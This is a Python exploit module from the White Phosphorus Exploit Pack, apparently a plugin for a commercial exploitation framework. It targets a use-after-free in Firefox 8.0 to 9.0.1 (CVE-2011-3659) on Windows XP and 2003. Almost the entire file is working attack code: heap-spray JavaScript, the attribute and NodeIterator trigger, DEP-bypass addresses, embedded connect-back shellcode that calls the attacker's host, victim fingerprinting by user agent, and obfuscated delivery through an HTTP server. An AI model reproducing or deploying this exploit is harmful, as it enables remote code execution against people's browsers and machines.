
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator


NAME = "Mozilla Firefox 8.0 -> 9.0.1 AttributeChildRemoved Use-After-Free Remote Code Execution"
DESCRIPTION = "Exploits a remote use-after-free in Mozilla Firefox"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Mozilla'
DOCUMENTATION["Date public"] = "2012-06-28"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="CVE-2011-3659"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3659'
DOCUMENTATION['CVSS'] = '7.5'
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-12-110/"
DOCUMENTATION["Notes"] = """
This is a browser based client-side exploit - use it via httpserver.
Vulnerability limits shellcode options to IE Inject Connect Back. Do not tick HTTP Mosdef or SSL in HTTP Server.

Module tested against:
- Firefox 8.0
- Firefox 8.0.1
- Firefox 9.0
- Firefox 9.0.1
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "2003" ]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
This is a browser based client-side exploit - use it via httpserver.
Vulnerability limits shellcode options to IE Inject Connect Back. Do not tick HTTP Mosdef or SSL in HTTP Server.

Module tested against:
- Firefox 8.0
- Firefox 8.0.1
- Firefox 9.0
- Firefox 9.0.1

-------------------------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Mozilla Firefox 8.0 -> 9.0.1 AttributeChildRemoved Use-After-Free Remote Code Execution
-------------------------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: Windows Universal 2003+XP (DEP)

Payloads:
0: IE Inject Connect Back

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_mozilla_firefox_attributechildremoved/wp_mozilla_firefox_attributechildremoved.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal 2003+XP (DEP) FF 8.0 -> 9.0.1", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit, httpclientside):
    PAYLOADS=["IE Inject Connect Back"]
    
    DEFAULT_PAYLOAD = 0

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.alignstack = True        
        self.HTTPMOSDEF = False
        self.useSSLMOSDEF = False
        self.isClientD=False
        self.badstring = "\x00\x5c"
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"          
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        return

    def is_vulnerable(self, info_dict):
        """
        Check for IE
        """
        self.isClientD = True
        if "Firefox/9" in info_dict['user_agent']:
            self.log("WP> Target has Firefox/9")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] #it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        elif "Firefox/8" in info_dict['user_agent']:
            self.log("WP> Target has Firefox/8")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] #it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        if getattr(self,'useSSLMOSDEF',False):
            self.isClientD = True
            self.DEFAULT_PAYLOAD = 1

        else:      
            if self.HTTPMOSDEF:
                if self.useSSLMOSDEF:
                    self.DEFAULT_PAYLOAD = 1
                else:
                    self.DEFAULT_PAYLOAD = 2
            
        self.wp_getShellcodeType()
        
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def makefile2003(self):
        sprayaddr = pack('<L', 0x0C101C0C)  # spray addr
        sprayaddr += pack('<L', 0x77BABF55) # pop - XP
        
        depSc = pack('<L', 0x77BCB802)
        depSc += self.wp_UniversalDEPBypassWin2k3_VP((len(self.shellcode)+16))
        depSc += self.shellcode
        depSc += wp_randomstring(2432 - len(depSc))
        
        filedata="""<html>
<head>
<script>
var shellcode = unescape("PAYLOAD");
var targetsize = 0x40000;
var offset_length = 0x606;

for (var i=0; i < 0x800; i++)
{
        var randomnumber1=Math.floor(Math.random()*90)+10;
        var randomnumber2=Math.floor(Math.random()*90)+10;
        var randomnumber3=Math.floor(Math.random()*90)+10;
        var randomnumber4=Math.floor(Math.random()*90)+10;
        var paddingstr = "%u" + randomnumber1.toString() + randomnumber2.toString();
        paddingstr += "%u" + randomnumber3.toString() + randomnumber4.toString();
        var padding = unescape(paddingstr);
        while (padding.length < 0x1000) padding+= padding;
        junk_offset = padding.substring(0, offset_length);
        var single_sprayblock = junk_offset + shellcode;
        single_sprayblock += padding.substring(0,0x800 - offset_length - shellcode.length);
        while (single_sprayblock.length < targetsize) single_sprayblock += single_sprayblock;
        sprayblock = single_sprayblock.substring(0, (targetsize-6)/2);
        varname = "var" + randomnumber1.toString() + randomnumber2.toString();
        varname += randomnumber3.toString() + randomnumber4.toString();
        thisvarname = "var " + varname + "= '" + sprayblock +"';";
        eval(thisvarname);
}
    
function run() {

    var attr = document.createAttribute("foo");
    attr.value = "bar";
  
    var ni = document.createNodeIterator(
      attr, NodeFilter.SHOW_ALL,
      {acceptNode: function(node) { return NodeFilter.FILTER_ACCEPT; }}
      ,false);
  
    ni.nextNode();
    ni.nextNode();
    ni.previousNode();
  
    attr.value = null;
  
    const addr = unescape("RANDPAD");
    var container = new Array();
    var small = unescape("SPRAYADDR");
    while (small.length != 30)
      small += addr;
    for (i = 0; i < 1024*1024*2; ++i)
      container.push(unescape(small));
  
    ni.referenceNode;
}
</script>
</head>
<body onload="run();">
</body>
</html>
"""
        filedata = filedata.replace('PAYLOAD', wp_urluencode(depSc))
        filedata = filedata.replace('SPRAYADDR',wp_urluencode(sprayaddr))
        filedata = filedata.replace('RANDPAD',wp_urluencode(wp_randomstring(4)))
        return filedata
        
    def makefileXP(self):
        sprayaddr = pack('<L', 0x0C101C0C)
        sprayaddr += pack('<L', 0x77C1BB36) # pop - XP
        
        depSc = pack('<L', 0x77C3A634)
        depSc += self.wp_UniversalDEPBypassWinXP_VP((len(self.shellcode)+8))
        depSc += self.shellcode
        depSc += wp_randomstring(2432 - len(depSc))
        
        filedata="""<html>
<head>
<script>
var shellcode = unescape("PAYLOAD");
var targetsize = 0x40000;
var offset_length = 0x606;

for (var i=0; i < 0x800; i++)
{
        var randomnumber1=Math.floor(Math.random()*90)+10;
        var randomnumber2=Math.floor(Math.random()*90)+10;
        var randomnumber3=Math.floor(Math.random()*90)+10;
        var randomnumber4=Math.floor(Math.random()*90)+10;
        var paddingstr = "%u" + randomnumber1.toString() + randomnumber2.toString();
        paddingstr += "%u" + randomnumber3.toString() + randomnumber4.toString();
        var padding = unescape(paddingstr);
        while (padding.length < 0x1000) padding+= padding;
        junk_offset = padding.substring(0, offset_length);
        var single_sprayblock = junk_offset + shellcode;
        single_sprayblock += padding.substring(0,0x800 - offset_length - shellcode.length);
        while (single_sprayblock.length < targetsize) single_sprayblock += single_sprayblock;
        sprayblock = single_sprayblock.substring(0, (targetsize-6)/2);
        varname = "var" + randomnumber1.toString() + randomnumber2.toString();
        varname += randomnumber3.toString() + randomnumber4.toString();
        thisvarname = "var " + varname + "= '" + sprayblock +"';";
        eval(thisvarname);
}
    
function run() {

    var attr = document.createAttribute("foo");
    attr.value = "bar";
  
    var ni = document.createNodeIterator(
      attr, NodeFilter.SHOW_ALL,
      {acceptNode: function(node) { return NodeFilter.FILTER_ACCEPT; }}
      ,false);
  
    ni.nextNode();
    ni.nextNode();
    ni.previousNode();
  
    attr.value = null;
  
    const addr = unescape("RANDPAD");
    var container = new Array();
    var small = unescape("SPRAYADDR");
    while (small.length != 30)
      small += addr;
    for (i = 0; i < 1024*1024*2; ++i)
      container.push(unescape(small));
  
    ni.referenceNode;
}
</script>
</head>
<body onload="run();">
</body>
</html>
"""
        filedata = filedata.replace('PAYLOAD', wp_urluencode(depSc))
        filedata = filedata.replace('SPRAYADDR',wp_urluencode(sprayaddr))
        filedata = filedata.replace('RANDPAD',wp_urluencode(wp_randomstring(4)))
        return filedata
    
    def makefile(self,browser,osversion):
        if osversion == "Windows 2003":
            self.log('WP> Serving Windows 2003 Exploit')
            return self.makefile2003()

        # Default to XP
        self.log('WP> Serving Windows XP Exploit')
        return self.makefileXP()

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])

        # Get details
        browser,osversion = wp_browserinfo(user_agent)
        self.log('WP> OSVersion: %s' % osversion)
        self.log('WP> Browser: %s' % browser)
        self.log('WP> ')
        self.log('WP> User agent of connecting host: %s' % user_agent)
        
        if not 'Firefox/9' in browser:
            if not 'Firefox/8' in browser:
                self.log('WP> Target browser invalid')
                return 0
        
        if clientheader.URL.count(self.filename):
            self.log('WP> Serving exploit file')

            data=self.makefile(browser,osversion)
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
